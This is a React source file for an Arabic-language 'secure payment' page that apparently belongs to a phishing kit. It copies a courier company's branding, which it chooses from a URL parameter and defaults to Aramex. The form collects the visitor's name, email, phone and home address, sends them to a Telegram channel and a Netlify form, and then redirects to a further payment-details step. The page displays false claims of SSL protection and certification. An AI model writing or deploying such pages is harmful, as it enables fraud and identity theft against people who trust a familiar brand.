import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Lock, CheckCircle, Package } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = `https://phenomenal-druid-91b4db.netlify.app${companyMeta.image}`;

  const shippingInfo = linkData?.payload as any;
  const payerType = shippingInfo?.payer_type || "recipient";

  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  const rawAmount = shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!linkData) return;

    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    const productionDomain = window.location.origin;
    await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
    }

    navigate(`/pay/${id}/details`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      
      <div className="min-h-screen bg-gray-50" dir="rtl">
        <div 
          className="w-full shadow-md"
          style={{ 
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            minHeight: '80px'
          }}
        >
          <div className="container mx-auto px-4 py-4">
            <div className="flex items-center justify-between max-w-4xl mx-auto">
              <div className="flex items-center gap-3">
                {branding.logo && (
                  <div className="bg-white rounded-lg p-2 shadow-md">
                    <img 
                      src={branding.logo} 
                      alt={serviceName}
                      className="h-10 w-auto"
                      onError={(e) => e.currentTarget.style.display = 'none'}
                    />
                  </div>
                )}
                <div className="text-white">
                  <h1 className="text-lg sm:text-xl font-bold">{serviceName}</h1>
                  <p className="text-xs sm:text-sm opacity-90">بوابة الدفع الآمنة</p>
                </div>
              </div>
              
              <div className="text-white text-left">
                <p className="text-xs opacity-90">المبلغ</p>
                <p className="text-lg font-bold">{formattedAmount}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8 max-w-3xl">
          <div className="mb-6 flex items-center justify-center gap-3 flex-wrap">
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
              <Shield className="w-5 h-5" style={{ color: branding.colors.primary }} />
              <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>تشفير SSL</span>
            </div>
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
              <Lock className="w-5 h-5" style={{ color: branding.colors.primary }} />
              <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>دفع آمن</span>
            </div>
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
              <CheckCircle className="w-5 h-5" style={{ color: branding.colors.primary }} />
              <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>معتمد</span>
            </div>
          </div>

          <Card className="shadow-xl border-0">
            <div 
              className="p-4 sm:p-6 rounded-t-xl"
              style={{ background: `linear-gradient(to left, ${branding.colors.primary}15, ${branding.colors.secondary}15)` }}
            >
              <div className="flex items-center gap-3">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center shadow-md"
                  style={{ background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})` }}
                >
                  <User className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl sm:text-2xl font-bold text-gray-800">
                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
                  </h2>
                  <p className="text-sm text-gray-600">أدخل بياناتك لإكمال عملية الدفع</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleProceed} className="p-6 sm:p-8">
              <div className="space-y-5">
                <div className="bg-gray-50 p-4 rounded-lg">
                  <div className="flex items-center gap-2 mb-3">
                    <Package className="w-4 h-4" style={{ color: branding.colors.primary }} />
                    <span className="text-sm font-semibold text-gray-700">تفاصيل الطلب</span>
                  </div>
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div>
                      <span className="text-gray-500">الخدمة:</span>
                      <span className="font-semibold mr-2">{serviceName}</span>
                    </div>
                    <div>
                      <span className="text-gray-500">المبلغ:</span>
                      <span className="font-bold mr-2" style={{ color: branding.colors.primary }}>{formattedAmount}</span>
                    </div>
                  </div>
                </div>

                <div>
                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <User className="w-4 h-4" style={{ color: branding.colors.primary }} />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding.colors.primary } as any}
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>
                
                <div>
                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <Mail className="w-4 h-4" style={{ color: branding.colors.primary }} />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding.colors.primary } as any}
                    placeholder="example@email.com"
                    dir="ltr"
                  />
                </div>
                
                <div>
                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <Phone className="w-4 h-4" style={{ color: branding.colors.primary }} />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding.colors.primary } as any}
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                    dir="ltr"
                  />
                  <p className="text-xs text-gray-500 mt-1">مثال: {phoneCode} {phonePlaceholder}</p>
                </div>
                
                <div>
                  <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <MapPin className="w-4 h-4" style={{ color: branding.colors.primary }} />
                    العنوان السكني *
                  </Label>
                  <Input
                    id="address"
                    value={residentialAddress}
                    onChange={(e) => setResidentialAddress(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding.colors.primary } as any}
                    placeholder="أدخل عنوانك السكني الكامل"
                  />
                </div>
              </div>

              <div className="mt-8 space-y-4">
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-lg py-7 text-white font-bold shadow-lg hover:shadow-xl transition-all"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <span className="ml-2">متابعة للدفع</span>
                  <ArrowLeft className="w-5 h-5 mr-2" />
                </Button>

                <div 
                  className="p-4 rounded-lg border-2"
                  style={{ 
                    background: `${branding.colors.primary}08`,
                    borderColor: `${branding.colors.primary}30`
                  }}
                >
                  <div className="flex items-start gap-3">
                    <Shield className="w-5 h-5 mt-0.5" style={{ color: branding.colors.primary }} />
                    <div>
                      <p className="text-sm font-semibold mb-1" style={{ color: branding.colors.primary }}>
                        دفع آمن ومشفر بالكامل
                      </p>
                      <p className="text-xs text-gray-600">
                        معلوماتك الشخصية محمية بأعلى معايير الأمان والتشفير. نحن نستخدم بروتوكول SSL لحماية بياناتك.
                      </p>
                    </div>
                  </div>
                </div>

                <p className="text-xs text-center text-gray-500">
                  بالمتابعة، أنت توافق على شروط وأحكام الخدمة وسياسة الخصوصية
                </p>
              </div>
            </form>
          </Card>

          <div className="mt-6 flex items-center justify-center gap-4 text-xs text-gray-500">
            <div className="flex items-center gap-1">
              <Lock className="w-3 h-3" />
              <span>معلوماتك مشفرة</span>
            </div>
            <span>•</span>
            <div className="flex items-center gap-1">
              <Shield className="w-3 h-3" />
              <span>حماية كاملة</span>
            </div>
            <span>•</span>
            <div className="flex items-center gap-1">
              <CheckCircle className="w-3 h-3" />
              <span>نظام موثوق</span>
            </div>
          </div>
        </div>

        <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
          <input type="text" name="name" />
          <input type="email" name="email" />
          <input type="tel" name="phone" />
          <input type="text" name="address" />
          <input type="text" name="service" />
          <input type="text" name="amount" />
          <input type="text" name="linkId" />
        </form>
      </div>
    </>
  );
};

export default PaymentRecipient;
